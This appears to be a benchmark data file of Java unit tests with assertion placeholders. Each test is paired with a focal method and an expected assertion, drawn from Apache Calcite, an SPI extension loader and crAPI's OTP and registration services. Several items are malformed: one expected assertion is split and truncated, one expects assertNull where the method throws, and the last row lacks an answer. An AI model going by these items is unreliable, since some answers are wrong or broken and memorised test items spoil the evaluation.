findBestExp() { ensureRootConverters(); registerMaterializations(); int cumulativeTicks = 0; for (VolcanoPlannerPhase phase : VolcanoPlannerPhase.values()) { prePhase(phase); setInitialImportance();  RelOptCost targetCost = costFactory.makeHugeCost(); int tick = 0; int firstFiniteTick = -1; int splitCount = 0; int giveUpTick = Integer.MAX_VALUE;  while (true) { ++tick; ++cumulativeTicks; if (root.bestCost.isLe(targetCost)) { if (firstFiniteTick < 0) { firstFiniteTick = cumulativeTicks;  clearImportanceBoost(); } if (ambitious) { // Choose a slightly more ambitious target cost, and // try again. If it took us 1000 iterations to find our // first finite plan, give ourselves another 100 // iterations to reduce the cost by 10%. targetCost = root.bestCost.multiplyBy(0.9); ++splitCount; if (impatient) { if (firstFiniteTick < 10) { // It's possible pre-processing can create // an implementable plan -- give us some time // to actually optimize it. giveUpTick = cumulativeTicks + 25; } else { giveUpTick = cumulativeTicks + Math.max(firstFiniteTick / 10, 25); } } } else { break; } } else if (cumulativeTicks > giveUpTick) { // We haven't made progress recently. Take the current best. break; } else if (root.bestCost.isInfinite() && ((tick % 10) == 0)) { injectImportanceBoost(); }  LOGGER.debug(""PLANNER = {}; TICK = {}/{}; PHASE = {}; COST = {}"", this, cumulativeTicks, tick, phase.toString(), root.bestCost);  VolcanoRuleMatch match = ruleQueue.popMatch(phase); if (match == null) { // RuleQueue is empty, create delayed TvrTrait one at a time LOGGER.debug(""RuleQueue drained, creating delayed tvr converters""); if (phasesToDrainTvrConverters.contains(phase) && createOneDelayedTvrConverter()) { continue; // Continue looping } else { break;    // Exit when delayCreateTvrTraits is also drained } }  assert match.getRule().matches(match); match.onMatch();  // The root may have been merged with another // subset. Find the new root subset. root = canonize(root); }  ruleQueue.phaseCompleted(phase); postPhase(phase); } if (LOGGER.isTraceEnabled()) { StringWriter sw = new StringWriter(); final PrintWriter pw = new PrintWriter(sw); dump(pw); pw.flush(); LOGGER.trace(sw.toString()); } RelNode cheapest = root.buildCheapestPlan(this); if (LOGGER.isDebugEnabled()) { LOGGER.debug( ""Cheapest plan:\n{}"", RelOptUtil.toString(cheapest, SqlExplainLevel.ALL_ATTRIBUTES));  LOGGER.debug(""Provenance:\n{}"", provenance(cheapest)); } return cheapest; }"	assertTrue(result instanceof PhysLeafRel)
"testTvrRuleMatch() { VolcanoPlanner planner = new VolcanoPlanner(); planner.addRelTraitDef(ConventionTraitDef.INSTANCE);  planner.addRule(LeafSnapshotRule.createInstance()); planner.addRule(SingleRelSnapshotRule.createInstance());  RelOptCluster cluster = newCluster(planner); PhysLeafRel leafRel = new PhysLeafRel(cluster, ""a""); PhysSingleRel singleRel = new PhysSingleRel(cluster, leafRel);  RelNode target = planner.getOrCreateSetFromTvrSet(singleRel, TvrMetaSetType.DEFAULT, SNAPSHOT, singleRel.deriveRowType(), cluster.traitSetOf(PHYS_CALLING_CONVENTION)); planner.setRoot(target); RelNode result = planner.chooseDelegate().findBestExp(); ""<AssertPlaceHolder>""; }
findBestExp() { ensureRootConverters(); registerMaterializations(); int cumulativeTicks = 0; for (VolcanoPlannerPhase phase : VolcanoPlannerPhase.values()) { prePhase(phase); setInitialImportance();  RelOptCost targetCost = costFactory.makeHugeCost(); int tick = 0; int firstFiniteTick = -1; int splitCount = 0; int giveUpTick = Integer.MAX_VALUE;  while (true) { ++tick; ++cumulativeTicks; if (root.bestCost.isLe(targetCost)) { if (firstFiniteTick < 0) { firstFiniteTick = cumulativeTicks;  clearImportanceBoost(); } if (ambitious) { // Choose a slightly more ambitious target cost, and // try again. If it took us 1000 iterations to find our // first finite plan, give ourselves another 100 // iterations to reduce the cost by 10%. targetCost = root.bestCost.multiplyBy(0.9); ++splitCount; if (impatient) { if (firstFiniteTick < 10) { // It's possible pre-processing can create // an implementable plan -- give us some time // to actually optimize it. giveUpTick = cumulativeTicks + 25; } else { giveUpTick = cumulativeTicks + Math.max(firstFiniteTick / 10, 25); } } } else { break; } } else if (cumulativeTicks > giveUpTick) { // We haven't made progress recently. Take the current best. break; } else if (root.bestCost.isInfinite() && ((tick % 10) == 0)) { injectImportanceBoost(); }  LOGGER.debug(""PLANNER = {}; TICK = {}/{}; PHASE = {}; COST = {}"", this, cumulativeTicks, tick, phase.toString(), root.bestCost);  VolcanoRuleMatch match = ruleQueue.popMatch(phase); if (match == null) { // RuleQueue is empty, create delayed TvrTrait one at a time LOGGER.debug(""RuleQueue drained, creating delayed tvr converters""); if (phasesToDrainTvrConverters.contains(phase) && createOneDelayedTvrConverter()) { continue; // Continue looping } else { break;    // Exit when delayCreateTvrTraits is also drained } }  assert match.getRule().matches(match); match.onMatch();  // The root may have been merged with another // subset. Find the new root subset. root = canonize(root); }  ruleQueue.phaseCompleted(phase); postPhase(phase); } if (LOGGER.isTraceEnabled()) { StringWriter sw = new StringWriter(); final PrintWriter pw = new PrintWriter(sw); dump(pw); pw.flush(); LOGGER.trace(sw.toString()); } RelNode cheapest = root.buildCheapestPlan(this); if (LOGGER.isDebugEnabled()) { LOGGER.debug( ""Cheapest plan:\n{}"", RelOptUtil.toString(cheapest, SqlExplainLevel.ALL_ATTRIBUTES));  LOGGER.debug(""Provenance:\n{}"", provenance(cheapest)); } return cheapest; }"	assertTrue(result instanceof PhysSingleRel)
"testEnsureTypeWithAny() { final RelDataTypeFactory typeFactory = new SqlTypeFactoryImpl(RelDataTypeSystem.DEFAULT); RexBuilder builder = new RexBuilder(typeFactory);  RexNode node =  new RexLiteral( Boolean.TRUE, typeFactory.createSqlType(SqlTypeName.BOOLEAN), SqlTypeName.BOOLEAN); RexNode ensuredNode = builder.ensureType( typeFactory.createSqlType(SqlTypeName.ANY), node, true);  ""<AssertPlaceHolder>""; }
ensureType( RelDataType type, RexNode node, boolean matchNullability) { RelDataType targetType = type; if (matchNullability) { targetType = matchNullability(type, node); }  if (targetType.getSqlTypeName() == SqlTypeName.ANY && (!matchNullability || targetType.isNullable() == node.getType().isNullable())) { return node; }  if (!node.getType().equals(targetType)) { return makeCast(targetType, node); } return node; }"	assertEquals(node, ensuredNode)
"testEnsureTypeWithItself() { final RelDataTypeFactory typeFactory = new SqlTypeFactoryImpl(RelDataTypeSystem.DEFAULT); RexBuilder builder = new RexBuilder(typeFactory);  RexNode node =  new RexLiteral( Boolean.TRUE, typeFactory.createSqlType(SqlTypeName.BOOLEAN), SqlTypeName.BOOLEAN); RexNode ensuredNode = builder.ensureType( typeFactory.createSqlType(SqlTypeName.BOOLEAN), node, true);  ""<AssertPlaceHolder>""; }
ensureType( RelDataType type, RexNode node, boolean matchNullability) { RelDataType targetType = type; if (matchNullability) { targetType = matchNullability(type, node); }  if (targetType.getSqlTypeName() == SqlTypeName.ANY && (!matchNullability || targetType.isNullable() == node.getType().isNullable())) { return node; }  if (!node.getType().equals(targetType)) { return makeCast(targetType, node); } return node; }"	assertEquals(node, ensuredNode)
"try { final RelBuilder builder = RelBuilder.create(config().build()); RelBuilder root = builder.values((String[]) null, ""a"", ""b""); fail(""expected error, got "" + root); } catch (IllegalArgumentException e) { ""<AssertPlaceHolder>""; }
build() { return stack.pop().rel; }"	"assertThat(e.getMessage(), is(""Value count must be a positive multiple of field count""))"
"try { final RelBuilder builder = RelBuilder.create(config().build()); RelBuilder root = builder.values(new String[0], 1, 2, 3); fail(""expected error, got "" + root); } catch (IllegalArgumentException e) { ""<AssertPlaceHolder>""; }
build() { return stack.pop().rel; }"	"assertThat(e.getMessage(), is(""Value count must be a positive multiple of field count""))"
"try { final RelBuilder builder = RelBuilder.create(config().build()); RelBuilder root = builder.values(new String[] {""a"", ""b""}, 1, 2, 3, 4, 5); fail(""expected error, got "" + root); } catch (IllegalArgumentException e) { ""<AssertPlaceHolder>""; }
build() { return stack.pop().rel; }"	"assertThat(e.getMessage(), is(""Value count must be a positive multiple of field count""))"
"try { final RelBuilder builder = RelBuilder.create(config().build()); RelBuilder root = builder.values(new String[] {""a"", ""b""}, null, null, 1, null); fail(""expected error, got "" + root); } catch (IllegalArgumentException e) { ""<AssertPlaceHolder>""; cannot deduce type"")); }
build() { return stack.pop().rel; }"	"assertThat(e.getMessage(), is(""All values of field 'b' are null"
"Exception { final SchemaPlus rootSchema = Frameworks.createRootSchema(true); final FrameworkConfig config = Frameworks.newConfigBuilder() .defaultSchema( CalciteAssert.addSchema(rootSchema, CalciteAssert.SchemaSpec.HR)) .build(); final Planner planner = Frameworks.getPlanner(config); SqlNode parse = planner.parse(""select * from ""emps"" ""); SqlNode val = planner.validate(parse);  String valStr = val.toSqlString(AnsiSqlDialect.DEFAULT, false).getSql();  String expandedStr = ""SELECT `emps`.`empid`, `emps`.`deptno`, `emps`.`name`, `emps`.`salary`, `emps`.`commission`\n"" + ""FROM `hr`.`emps` AS `emps`""; ""<AssertPlaceHolder>""; }
getPlanner(FrameworkConfig config) { return new PlannerImpl(config); }"	assertThat(Util.toLinux(valStr), equalTo(expandedStr))
"Exception { Program program0 = Programs.ofRules( FilterMergeRule.INSTANCE, EnumerableRules.ENUMERABLE_FILTER_RULE, EnumerableRules.ENUMERABLE_PROJECT_RULE);  JdbcConvention out = new JdbcConvention(null, null, ""myjdbc""); Program program1 = Programs.ofRules( new MockJdbcProjectRule(out), new MockJdbcTableRule(out));  Planner planner = getPlanner(null, program0, program1); SqlNode parse = planner.parse(""select T1.""name"" from ""emps"" as T1 "");  SqlNode validate = planner.validate(parse); RelNode convert = planner.rel(validate).project();  RelTraitSet traitSet0 = planner.getEmptyTraitSet() .replace(EnumerableConvention.INSTANCE);  RelTraitSet traitSet1 = planner.getEmptyTraitSet() .replace(out);  RelNode transform = planner.transform(0, traitSet0, convert); RelNode transform2 = planner.transform(1, traitSet1, transform); ""<AssertPlaceHolder>""; }
transform(int ruleSetIndex, RelTraitSet requiredOutputTraits, RelNode rel) throws RelConversionException;  /** * Resets this {@code Planner}"	"assertThat(toString(transform2), equalTo(""JdbcProject(name=[$2])\n"" + ""  MockJdbcTableScan(table=[[hr, emps]])\n""))"
"""<AssertPlaceHolder>"";
previousClearBit(BitSet bitSet, int fromIndex) { if (fromIndex < -1) { throw new IndexOutOfBoundsException(); } while (fromIndex >= 0) { if (!bitSet.get(fromIndex)) { return fromIndex; } --fromIndex; } return -1; }"	assertThat(BitSets.previousClearBit(BitSets.of(), 10), equalTo(10))
"""<AssertPlaceHolder>"";
of() { return EMPTY; }"	assertThat(ImmutableBitSet.valueOf(0L), equalTo(ImmutableBitSet.of()))
"""<AssertPlaceHolder>"";
isDistinct(List<E> list) { return firstDuplicate(list) < 0; }"	assertTrue(Util.isDistinct(Collections.emptyList()))
"""<AssertPlaceHolder>"";
firstDuplicate(List<E> list) { final int size = list.size(); if (size < 2) { // Lists of size 0 and 1 are always distinct. return -1; } if (size < 15) { // For smaller lists, avoid the overhead of creating a set. Threshold // determined empirically using UtilTest.testIsDistinctBenchmark. for (int i = 1; i < size; i++) { E e = list.get(i); for (int j = i - 1; j >= 0; j--) { E e1 = list.get(j); if (Objects.equals(e, e1)) { return i; } } } return -1; } final Map<E, Object> set = new HashMap<>(size); for (E e : list) { if (set.put(e, """") != null) { return set.size(); } } return -1; }"	assertThat(Util.firstDuplicate(ImmutableList.of()), equalTo(-1))
"""<AssertPlaceHolder>"";
startsWith(List<E> list0, List<E> list1) { if (list0 == list1) { return true; } final int size = list1.size(); if (list0.size() < size) { return false; } for (int i = 0; i < size; i++) { if (!Objects.equals(list0.get(i), list1.get(i))) { return false; } } return true; }"	"assertThat(Util.startsWith(list(""x""), list()), is(true))"
"""<AssertPlaceHolder>"";
human(double d) { if (d == 0d) { return ""0""; } if (d < 0d) { return ""-"" + human(-d); } final int digitCount = (int) Math.floor(Math.log10(d)); switch (digitCount) { case 0: case 1: case 2: return Integer.toString((int) d); case 3: case 4: case 5: return digits3(Math.round(d / 10D), digitCount % 3) + ""K""; case 6: case 7: case 8: return digits3(Math.round(d / 10000D), digitCount % 3) + ""M""; case 9: case 10: case 11: return digits3(Math.round(d / 10000000D), digitCount % 3) + ""G""; default: return Double.toString(d); } }"	"assertThat(Util.human(0D), equalTo(""0""))"
"""<AssertPlaceHolder>"";
count() { return getCollection().size(); }"	assertEquals(2, Linq4j.asEnumerable(depts).skip(1).count())
"""<AssertPlaceHolder>"";
assignableFrom(Primitive primitive) { return family == primitive.family && ordinal() >= primitive.ordinal() && !(this == SHORT && primitive == CHAR) && !(this == CHAR && primitive == BYTE); }"	assertTrue(Primitive.INT.assignableFrom(Primitive.BYTE))
"""<AssertPlaceHolder>"";
ofBox(Type type) { //noinspection SuspiciousMethodCalls return BOX_MAP.get(type); }"	assertEquals(Primitive.INT, Primitive.ofBox(Integer.class))
"""<AssertPlaceHolder>"";
ofBox(Type type) { //noinspection SuspiciousMethodCalls return BOX_MAP.get(type); }"	assertEquals(Primitive.INT, Primitive.ofBox(Integer.class))
"testQueryEventOffset() { Assert.""<AssertPlaceHolder>""; }
queryEventOffset() { try { List<Map<String, Object>> list = new ArrayList<>(); Set<String> set = dataSourceNameMap.keySet(); for (String name : set) { DataSource dataSource = dataSourceNameMap.get(name); QueryRunner queryRunner = new QueryRunner(dataSource); List<Map<String, Object>> rows = queryRunner.query(QUERY_EVENT_OFFSET, new MapListHandler()); list.addAll(rows); } return CompletableFuture.completedFuture(list); } catch (Throwable e) { CompletableFuture<List<Map<String, Object>>> future = new CompletableFuture<>(); future.completeExceptionally(e); return future; } }"	assertTrue(!offset.queryEventOffset().join().isEmpty())
"testSPI() { JdbcSPI jdbcSPI = ExtensionLoader.getExtensionLoader(JdbcSPI.class).getJoin(""mysql""); ""<AssertPlaceHolder>""; }
getJoin(final String name) { if (StringUtils.isBlank(name)) { throw new NullPointerException(""get join name is null""); } Holder<Object> objectHolder = cachedInstances.get(name); if (Objects.isNull(objectHolder)) { cachedInstances.putIfAbsent(name, new Holder<>()); objectHolder = cachedInstances.get(name); } Object value = objectHolder.getValue(); if (Objects.isNull(value)) { synchronized (cachedInstances) { value = objectHolder.getValue(); if (Objects.isNull(value)) { value = createExtension(name); objectHolder.setValue(value); } } } return (T) value; }"	assertThat(jdbcSPI.getClass().getName(), is(MysqlSPI.class.getName()))
"testSPIEmptySPI() { List<EmptySPI> joins = ExtensionLoader.getExtensionLoader(EmptySPI.class).getJoins(); ""<AssertPlaceHolder>""; }
getJoins() { Map<String, Class<?>> extensionClasses = this.getExtensionClasses(); if (extensionClasses.isEmpty()) { return Collections.emptyList(); } if (Objects.equals(extensionClasses.size(), cachedInstances.size())) { return (List<T>) this.cachedInstances.values().stream().map(e -> { return e.getValue(); }).collect(Collectors.toList()); } List<T> joins = new ArrayList<>(); extensionClasses.forEach((name, v) -> { T join = this.getJoin(name); joins.add(join); }); return joins; }"	assertEquals(joins.size(), 0)
"testSPIGetDefaultJoin() { HasDefaultSPI spi = ExtensionLoader.getExtensionLoader(HasDefaultSPI.class).getDefaultJoin(); assert spi != null; ""<AssertPlaceHolder>""; }
getDefaultJoin() { getExtensionClasses(); if (StringUtils.isBlank(cachedDefaultName)) { return null; } return getJoin(cachedDefaultName); }"	assertThat(spi.getClass().getName(), is(SubHasDefaultSPI.class.getName()))
"testSPINoDefaultJoin() { JdbcSPI jdbcSPI = ExtensionLoader.getExtensionLoader(JdbcSPI.class).getDefaultJoin(); ""<AssertPlaceHolder>""; }
getDefaultJoin() { getExtensionClasses(); if (StringUtils.isBlank(cachedDefaultName)) { return null; } return getJoin(cachedDefaultName); }"	assertNull(jdbcSPI)
"testSPIGetJoinNameIsBlank() { try { ExtensionLoader.getExtensionLoader(JdbcSPI.class).getJoin(""""); fail(); } catch (NullPointerException expected) { ""<AssertPlaceHolder>""; } }
getJoin(final String name) { if (StringUtils.isBlank(name)) { throw new NullPointerException(""get join name is null""); } Holder<Object> objectHolder = cachedInstances.get(name); if (Objects.isNull(objectHolder)) { cachedInstances.putIfAbsent(name, new Holder<>()); objectHolder = cachedInstances.get(name); } Object value = objectHolder.getValue(); if (Objects.isNull(value)) { synchronized (cachedInstances) { value = objectHolder.getValue(); if (Objects.isNull(value)) { value = createExtension(name); objectHolder.setValue(value); } } } return (T) value; }"	"assertThat(expected.getMessage(), containsString(""get join name is null""))"
"testGetExtensionLoaderIsNull() { try { ExtensionLoader.getExtensionLoader(null); fail(); } catch (NullPointerException expected) { ""<AssertPlaceHolder>""; } }
getExtensionLoader(final Class<T> clazz) { return getExtensionLoader(clazz, ExtensionLoader.class.getClassLoader()); }"	"assertThat(expected.getMessage(), containsString(""extension clazz is null""))"
"testGetExtensionLoaderNotInterface() { try { ExtensionLoader.getExtensionLoader(ExtensionLoaderTest.class); fail(); } catch (IllegalArgumentException expected) { ""<AssertPlaceHolder>""; } }
getExtensionLoader(final Class<T> clazz) { return getExtensionLoader(clazz, ExtensionLoader.class.getClassLoader()); }"	"assertThat(expected.getMessage(), containsString(""extension clazz (class com.damon.cqrs.spi.ExtensionLoaderTest) is not interface!""))"
"testGetExtensionLoaderNotSpiAnnotation() { try { ExtensionLoader.getExtensionLoader(NopSPI.class); fail(); } catch (IllegalArgumentException expected) { ""<AssertPlaceHolder>""; } }
getExtensionLoader(final Class<T> clazz) { return getExtensionLoader(clazz, ExtensionLoader.class.getClassLoader()); }"	"assertThat(expected.getMessage(), containsString(""extension clazz (interface com.damon.cqrs.spi.fixture.NopSPI) without @interface com.damon.cqrs.spi.SPI Annotation""))"
"testGetExtensionLoaderNonentitySPIName() { try { ExtensionLoader.getExtensionLoader(JdbcSPI.class).getJoin(""nonentitySPIName""); fail(); } catch (IllegalArgumentException expected) { ""<AssertPlaceHolder>""; } }
getJoin(final String name) { if (StringUtils.isBlank(name)) { throw new NullPointerException(""get join name is null""); } Holder<Object> objectHolder = cachedInstances.get(name); if (Objects.isNull(objectHolder)) { cachedInstances.putIfAbsent(name, new Holder<>()); objectHolder = cachedInstances.get(name); } Object value = objectHolder.getValue(); if (Objects.isNull(value)) { synchronized (cachedInstances) { value = objectHolder.getValue(); if (Objects.isNull(value)) { value = createExtension(name); objectHolder.setValue(value); } } } return (T) value; }"	"assertThat(expected.getMessage(), containsString(""name is error""))"
"testGetExtensionLoaderSPISubTypeNotMatchInterface() { try { ExtensionLoader.getExtensionLoader(NotMatchSPI.class).getJoin(""subNoJoinSPI""); fail(); } catch (IllegalStateException expected) { ""<AssertPlaceHolder>""; } }
getJoin(final String name) { if (StringUtils.isBlank(name)) { throw new NullPointerException(""get join name is null""); } Holder<Object> objectHolder = cachedInstances.get(name); if (Objects.isNull(objectHolder)) { cachedInstances.putIfAbsent(name, new Holder<>()); objectHolder = cachedInstances.get(name); } Object value = objectHolder.getValue(); if (Objects.isNull(value)) { synchronized (cachedInstances) { value = objectHolder.getValue(); if (Objects.isNull(value)) { value = createExtension(name); objectHolder.setValue(value); } } } return (T) value; }"	"assertThat(expected.getMessage(), containsString(""load extension resources error,class com.damon.cqrs.spi.fixture.SubNoJoinSPI subtype is not of interface com.damon.cqrs.spi.fixture.NotMatchSPI""))"
"testGetExtensionLoaderNoClassMatchSPI() { try { ExtensionLoader.getExtensionLoader(NoClassMatchSPI.class).getJoin(""subNoClassMatchSPI""); fail(); } catch (IllegalStateException expected) { ""<AssertPlaceHolder>""; } }
getJoin(final String name) { if (StringUtils.isBlank(name)) { throw new NullPointerException(""get join name is null""); } Holder<Object> objectHolder = cachedInstances.get(name); if (Objects.isNull(objectHolder)) { cachedInstances.putIfAbsent(name, new Holder<>()); objectHolder = cachedInstances.get(name); } Object value = objectHolder.getValue(); if (Objects.isNull(value)) { synchronized (cachedInstances) { value = objectHolder.getValue(); if (Objects.isNull(value)) { value = createExtension(name); objectHolder.setValue(value); } } } return (T) value; }"	"assertThat(expected.getMessage(), containsString(""load extension resources error""))"
"testGetExtensionLoaderNoJoinSPI() { try { ExtensionLoader.getExtensionLoader(NoJoinSPI.class).getJoin(""subNoJoinSPI""); fail(); } catch (IllegalStateException expected) { ""<AssertPlaceHolder>""; } }
getJoin(final String name) { if (StringUtils.isBlank(name)) { throw new NullPointerException(""get join name is null""); } Holder<Object> objectHolder = cachedInstances.get(name); if (Objects.isNull(objectHolder)) { cachedInstances.putIfAbsent(name, new Holder<>()); objectHolder = cachedInstances.get(name); } Object value = objectHolder.getValue(); if (Objects.isNull(value)) { synchronized (cachedInstances) { value = objectHolder.getValue(); if (Objects.isNull(value)) { value = createExtension(name); objectHolder.setValue(value); } } } return (T) value; }"	"assertThat(expected.getMessage(), containsString(""load extension resources error,class com.damon.cqrs.spi.fixture.SubNoJoinSPI without @interface com.damon.cqrs.spi.Join annotation""))"
"testGetExtensionLoaderCanNotInstantiatedSPI() { try { ExtensionLoader.getExtensionLoader(JdbcSPI.class).getJoin(""canNotInstantiated""); fail(); } catch (IllegalStateException expected) { ""<AssertPlaceHolder>""; } }
getJoin(final String name) { if (StringUtils.isBlank(name)) { throw new NullPointerException(""get join name is null""); } Holder<Object> objectHolder = cachedInstances.get(name); if (Objects.isNull(objectHolder)) { cachedInstances.putIfAbsent(name, new Holder<>()); objectHolder = cachedInstances.get(name); } Object value = objectHolder.getValue(); if (Objects.isNull(value)) { synchronized (cachedInstances) { value = objectHolder.getValue(); if (Objects.isNull(value)) { value = createExtension(name); objectHolder.setValue(value); } } } return (T) value; }"	"assertThat(expected.getMessage(), containsString( ""Extension instance(name: canNotInstantiated, class: class com.damon.cqrs.spi.fixture.CanNotInstantiatedSPI)""))"
"IllegalAccessException { Method loadClassMethod = getLoadClassMethod(); ExtensionLoader<JdbcSPI> extensionLoader = ExtensionLoader.getExtensionLoader(JdbcSPI.class); Map<String, Class<?>> classes = new HashMap<>(); loadClassMethod.invoke(extensionLoader, classes, ""mysql"", ""com.damon.cqrs.spi.fixture.MysqlSPI""); try { loadClassMethod.invoke(extensionLoader, classes, ""mysql"", ""com.damon.cqrs.spi.fixture.OracleSPI""); fail(); } catch (InvocationTargetException expect) { ""<AssertPlaceHolder>""; } }
getExtensionLoader(final Class<T> clazz) { return getExtensionLoader(clazz, ExtensionLoader.class.getClassLoader()); }"	"assertThat(expect.getTargetException().getMessage(), containsString( ""load extension resources error,Duplicate class com.damon.cqrs.spi.fixture.JdbcSPI name mysql on "" + ""com.damon.cqrs.spi.fixture.MysqlSPI or com.damon.cqrs.spi.fixture.OracleSPI""))"
"invalidateOtpSuccess() { Otp otp = getDummyOtp(); Mockito.when(otpRepository.save(Mockito.any())).thenReturn(otp); Assertions.""<AssertPlaceHolder>""; }
invalidateOtp(Otp otp) { try { otp.setStatus(EStatus.INACTIVE.toString()); Otp saveOtp = otpRepository.save(otp); return true; } catch (Exception e) { log.error(""Fail to invalidate otp -> Message: {}"", e); return false; } }"	assertTrue(otpService.invalidateOtp(otp))
"validateOTPAndEmailSuccess() { Otp otp = getDummyOtp(); OtpForm otpForm = getDummyOtpForm(); otpForm.setOtp(otp.getOtp()); otp.setStatus(EStatus.ACTIVE.toString()); otp.getUser().setEmail(otpForm.getEmail()); Assertions.""<AssertPlaceHolder>""; }
validateOTPAndEmail(Otp otp, OtpForm otpForm) { if (otp != null) { if (otp.getStatus().equalsIgnoreCase(EStatus.ACTIVE.toString()) && otp.getOtp().equalsIgnoreCase(otpForm.getOtp()) && otp.getUser().getEmail().equalsIgnoreCase(otpForm.getEmail())) { return true; } return false; } throw new EntityNotFoundException(Otp.class, ""OTP Details Not Found"", otpForm.getEmail()); }"	assertTrue(otpService.validateOTPAndEmail(otp, otpForm))
"validateOTPAndEmailFailureWhenFormAndOtpNotMatch() { Otp otp = getDummyOtp(); OtpForm otpForm = getDummyOtpForm(); Assertions.""<AssertPlaceHolder>""; }
validateOTPAndEmail(Otp otp, OtpForm otpForm) { if (otp != null) { if (otp.getStatus().equalsIgnoreCase(EStatus.ACTIVE.toString()) && otp.getOtp().equalsIgnoreCase(otpForm.getOtp()) && otp.getUser().getEmail().equalsIgnoreCase(otpForm.getEmail())) { return true; } return false; } throw new EntityNotFoundException(Otp.class, ""OTP Details Not Found"", otpForm.getEmail()); }"	assertFalse(otpService.validateOTPAndEmail(otp, otpForm))
"loadUserByUsernameSuccess() { User user = getDummyUser(); Mockito.when(userRepository.findByEmail(Mockito.anyString())).thenReturn(user); UserDetails userDetails = userDetailsService.loadUserByUsername(user.getEmail()); Assertions.""<AssertPlaceHolder>""; }
loadUserByUsername(String email) { try { User user = userRepository.findByEmail(email); log.debug(""User: {}"", user); return UserPrinciple.build(user); } catch (Exception e) { throw new UsernameNotFoundException(""User does not exist with Email :"" + email); } }"	assertNotNull(userDetails)
"loadUserByUsernameFailure() { User user = getDummyUser(); Mockito.when(userRepository.findByEmail(Mockito.anyString())).thenThrow(new RuntimeException()); UserDetails userDetails = userDetailsService.loadUserByUsername(user.getEmail()); Assertions.""<AssertPlaceHolder>""; }
loadUserByUsername(String email) { try { User user = userRepository.findByEmail(email); log.debug(""User: {}"", user); return UserPrinciple.build(user); } catch (Exception e) { throw new UsernameNotFoundException(""User does not exist with Email :"" + email); } }"	assertNull(userDetails)
"registerUserReturnsNumberAlreadyExists() { SignUpForm signUpForm = getDummySignUpForm(); String expectedMessage = UserMessage.NUMBER_ALREADY_REGISTERED + signUpForm.getNumber(); Mockito.when(userRepository.existsByNumber(signUpForm.getNumber())).thenReturn(true); Assertions.""<AssertPlaceHolder>""; Mockito.verify(userRepository, Mockito.times(1)).existsByNumber(Mockito.any()); Mockito.verify(userRepository, Mockito.times(0)).existsByEmail(Mockito.any()); }
registerUser(SignUpForm signUpRequest) { User user; UserDetails userDetails; VehicleDetails vehicleDetails; // Check Number in database if (userRepository.existsByNumber(signUpRequest.getNumber())) { return new CRAPIResponse( UserMessage.NUMBER_ALREADY_REGISTERED + signUpRequest.getNumber(), 403); } // check Number in database if (userRepository.existsByEmail(signUpRequest.getEmail())) { return new CRAPIResponse( UserMessage.EMAIL_ALREADY_REGISTERED + signUpRequest.getEmail(), 403); } // Register new user in Database user = new User( signUpRequest.getEmail(), signUpRequest.getNumber(), encoder.encode(signUpRequest.getPassword()), ERole.ROLE_USER); user = userRepository.save(user); if (user != null) { log.info(""User registered successful with userId {}"", user.getId()); // Creating User Details for same user userDetails = createUserDetails(signUpRequest.getName(), user); if (userDetails != null) { userDetailsRepository.save(userDetails); log.info(""User Details Created successful with userId {}"", userDetails.getId()); }  // Creating User Vehicle vehicleDetails = vehicleService.createVehicle(); if (vehicleDetails != null) { smtpMailServer.sendMail( user.getEmail(), MailBody.signupMailBody( vehicleDetails, (userDetails != null && userDetails.getName() != null ? userDetails.getName() : """")), ""Welcome to crAPI""); return new CRAPIResponse(UserMessage.SIGN_UP_SUCCESS_MESSAGE, 200); } throw new EntityNotFoundException( VehicleDetails.class, UserMessage.ERROR, signUpRequest.getName()); } log.info(""User registration failed {}"", signUpRequest.getEmail()); return new CRAPIResponse(UserMessage.SIGN_UP_FAILED + signUpRequest.getEmail(), 400); }"	assertEquals( userRegistrationService.registerUser(signUpForm).getMessage(), expectedMessage)
"registerUserReturnsEmailAlreadyExists() { SignUpForm signUpForm = getDummySignUpForm(); String expectedMessage = UserMessage.EMAIL_ALREADY_REGISTERED + signUpForm.getEmail(); Mockito.when(userRepository.existsByNumber(signUpForm.getNumber())).thenReturn(false); Mockito.when(userRepository.existsByEmail(signUpForm.getEmail())).thenReturn(true); Assertions.""<AssertPlaceHolder>""; Mockito.verify(userRepository, Mockito.times(1)).existsByNumber(Mockito.any()); Mockito.verify(userRepository, Mockito.times(1)).existsByEmail(Mockito.any()); }
registerUser(SignUpForm signUpRequest) { User user; UserDetails userDetails; VehicleDetails vehicleDetails; // Check Number in database if (userRepository.existsByNumber(signUpRequest.getNumber())) { return new CRAPIResponse( UserMessage.NUMBER_ALREADY_REGISTERED + signUpRequest.getNumber(), 403); } // check Number in database if (userRepository.existsByEmail(signUpRequest.getEmail())) { return new CRAPIResponse( UserMessage.EMAIL_ALREADY_REGISTERED + signUpRequest.getEmail(), 403); } // Register new user in Database user = new User( signUpRequest.getEmail(), signUpRequest.getNumber(), encoder.encode(signUpRequest.getPassword()), ERole.ROLE_USER); user = userRepository.save(user); if (user != null) { log.info(""User registered successful with userId {}"", user.getId()); // Creating User Details for same user userDetails = createUserDetails(signUpRequest.getName(), user); if (userDetails != null) { userDetailsRepository.save(userDetails); log.info(""User Details Created successful with userId {}"", userDetails.getId()); }  // Creating User Vehicle vehicleDetails = vehicleService.createVehicle(); if (vehicleDetails != null) { smtpMailServer.sendMail( user.getEmail(), MailBody.signupMailBody( vehicleDetails, (userDetails != null && userDetails.getName() != null ? userDetails.getName() : """")), ""Welcome to crAPI""); return new CRAPIResponse(UserMessage.SIGN_UP_SUCCESS_MESSAGE, 200); } throw new EntityNotFoundException( VehicleDetails.class, UserMessage.ERROR, signUpRequest.getName()); } log.info(""User registration failed {}"", signUpRequest.getEmail()); return new CRAPIResponse(UserMessage.SIGN_UP_FAILED + signUpRequest.getEmail(), 400); }"	assertEquals( userRegistrationService.registerUser(signUpForm).getMessage(), expectedMessage)
"registerUserSuccessFull() { SignUpForm signUpForm = getDummySignUpForm(); User user = getDummyUser(); Mockito.when(userRepository.existsByNumber(signUpForm.getNumber())).thenReturn(false); Mockito.when(userRepository.existsByEmail(signUpForm.getEmail())).thenReturn(false); Mockito.when(encoder.encode(Mockito.anyString())).thenReturn(""EncodedString""); Mockito.when(userRepository.save(Mockito.any(User.class))).thenReturn(user); Mockito.when(userDetailsRepository.save(Mockito.any(UserDetails.class))) .thenReturn(getDummyUserDetails()); Mockito.when(vehicleService.createVehicle()).thenReturn(new VehicleDetails()); Mockito.doNothing() .when(smtpMailServer) .sendMail(Mockito.anyString(), Mockito.anyString(), Mockito.anyString()); Assertions.""<AssertPlaceHolder>""; Mockito.verify(smtpMailServer, Mockito.times(1)) .sendMail(Mockito.anyString(), Mockito.anyString(), Mockito.anyString()); }
